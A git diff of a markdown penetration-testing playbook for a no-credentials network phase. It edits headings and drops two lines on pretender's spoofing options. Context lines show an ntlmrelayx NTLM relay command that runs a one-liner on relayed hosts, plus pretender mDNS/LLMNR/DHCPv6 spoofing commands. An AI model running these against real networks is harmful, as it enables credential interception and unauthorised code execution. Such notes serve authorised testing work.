@@ -28,6 +28,7 @@ console.log(foo);
 
 
 
+
 ## Phase 1 - No Creds
 
 ## 1a. Network Recon
@@ -343,6 +344,8 @@ ntlmrelayx.py -6 -tf relays.txt -c $oneliner
 ```
 
 
+## 1c. Playbooks
+
 ## Phase 1c. Playbooks
 
 #### Initial Relay to PrinterBug
@@ -351,9 +354,6 @@ ntlmrelayx.py -6 -tf relays.txt -c $oneliner
 ./pretender -i $if --dry --no-ra # without router advertisements
 ```
 
-##### Local name resolution spoofing via mDNS, LLMNR and NetBIOS-NS as well as a DHCPv6 DNS takeover with router advertisement
-
-##### You can disable certain attacks with --no-dhcp-dns (disabled DHCPv6, DNS and router advertisements), --no-lnr (disabled mDNS, LLMNR and NetBIOS-NS), --no-mdns, --no-llmnr, --no-netbios and --no-ra
 ```bash
 ./pretender -i $if --dont-spoof-for 172.20.48.1
 ```
